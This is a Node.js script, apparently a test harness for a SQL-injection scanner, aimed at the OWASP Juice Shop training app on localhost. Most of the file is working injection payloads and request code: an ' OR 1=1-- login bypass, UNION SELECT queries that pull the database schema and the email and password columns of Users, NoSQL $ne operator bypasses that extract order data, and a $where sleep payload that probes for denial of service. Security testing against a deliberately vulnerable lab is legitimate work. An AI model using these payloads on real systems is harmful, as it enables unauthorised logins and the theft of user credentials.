#!/usr/bin/env node
import axios from 'axios';
import { SqlScanner } from '../dist/esm/index.js';

async function run() {
  const baseUrl = process.env.JUICE_URL || 'http://127.0.0.1:3000';
  const scanner = new SqlScanner();

  const smart = await scanner.smartScan({
    baseUrl,
    maxPages: 1,
    techniques: { error: true, boolean: true, time: true, nosql: true },
    concurrency: 4,
    timeoutMs: 8000,
  });

  // Try classic SQLi login PoC
  let loginPoC = null;
  try {
    const res = await axios.post(baseUrl + '/rest/user/login', {
      email: "' OR 1=1--",
      password: 'x',
    }, { validateStatus: () => true });
    loginPoC = {
      status: res.status,
      token: res.data?.authentication?.token,
      success: Boolean(res.data?.authentication?.token),
    };
  } catch (e) {
    loginPoC = { error: String(e) };
  }

  // Targeted SQL UNION PoCs for Database Schema & User Credentials
  const search = async (payload) => {
    const url = baseUrl + '/rest/products/search?q=' + encodeURIComponent(payload);
    return axios.get(url, { validateStatus: () => true });
  };
  const unionPayloadsSchema = [
    "' UNION SELECT name, sql, 1, 1 FROM sqlite_master--",
    "') UNION SELECT name, sql, 1, 1 FROM sqlite_master--",
    '" UNION SELECT name, sql, 1, 1 FROM sqlite_master--',
    "' UNION SELECT sql, name, 1, 1 FROM sqlite_master--",
    "' UNION SELECT 1, sql, name, 1 FROM sqlite_master--",
    "' UNION SELECT 1, 1, name, sql FROM sqlite_master--",
  ];
  const unionPayloadsUsers = [
    "' UNION SELECT email, password, 1, 1 FROM Users--",
    "') UNION SELECT email, password, 1, 1 FROM Users--",
    '" UNION SELECT email, password, 1, 1 FROM Users--',
    "' UNION SELECT 1, email, password, 1 FROM Users--",
    "' UNION SELECT 1, 1, email, password FROM Users--",
  ];
  const unionResults = { schema: [], users: [] };
  try {
    for (const p of unionPayloadsSchema) {
      const r = await search(p);
      if (r.status === 200 && Array.isArray(r.data?.data || r.data)) {
        const arr = r.data.data || r.data;
        const txt = JSON.stringify(arr).toUpperCase();
        if (txt.includes('CREATE TABLE') || txt.includes('SQLITE_MASTER')) {
          unionResults.schema.push({ payload: p, count: arr.length });
          break;
        }
      }
    }
    for (const p of unionPayloadsUsers) {
      const r = await search(p);
      if (r.status === 200 && Array.isArray(r.data?.data || r.data)) {
        const arr = r.data.data || r.data;
        const txt = JSON.stringify(arr);
        if (/\b[a-zA-Z0-9_.-]+@juice-sh\.op\b/.test(txt)) {
          unionResults.users.push({ payload: p, count: arr.length });
          break;
        }
      }
    }
  } catch {}

  // NoSQL PoCs: login bypass and orders exfiltration + potential DoS via time
  const nosql = { loginBypass: null, ordersExfil: null, ordersDos: null };
  try {
    const r = await axios.post(baseUrl + '/rest/user/login', {
      email: { $ne: null },
      password: { $ne: null },
    }, { validateStatus: () => true });
    nosql.loginBypass = {
      status: r.status,
      token: r.data?.authentication?.token,
      success: Boolean(r.data?.authentication?.token),
    };
  } catch {}
  try {
    const r1 = await axios.post(baseUrl + '/rest/track-order', { id: { $ne: null } }, { validateStatus: () => true });
    const r2 = await axios.post(baseUrl + '/rest/track-order', { orderId: { $ne: null } }, { validateStatus: () => true });
    nosql.ordersExfil = {
      status1: r1?.status,
      len1: typeof r1?.data === 'string' ? r1.data.length : JSON.stringify(r1?.data || '').length,
      status2: r2?.status,
      len2: typeof r2?.data === 'string' ? r2.data.length : JSON.stringify(r2?.data || '').length,
    };
  } catch {}
  try {
    const t0 = Date.now();
    await axios.post(baseUrl + '/rest/track-order', { $where: 'sleep(3000)' }, { timeout: 8000, validateStatus: () => true });
    const dt = Date.now() - t0;
    nosql.ordersDos = { elapsedMs: dt };
  } catch (e) {
    if (e?.code === 'ECONNABORTED') {
      nosql.ordersDos = { timeout: true };
    } else {
      nosql.ordersDos = { error: String(e) };
    }
  }

  // Fetch challenges
  let challenges = null;
  try {
    const { data } = await axios.get(baseUrl + '/api/Challenges/');
    challenges = data?.data || data;
  } catch (e) {
    challenges = { error: String(e) };
  }

  const out = {
    baseUrl,
    scan: smart,
    loginPoC,
    union: unionResults,
    nosql,
    challenges,
  };
  console.log(JSON.stringify(out, null, 2));
}

run().catch((e) => {
  console.error(e);
  process.exit(1);
});
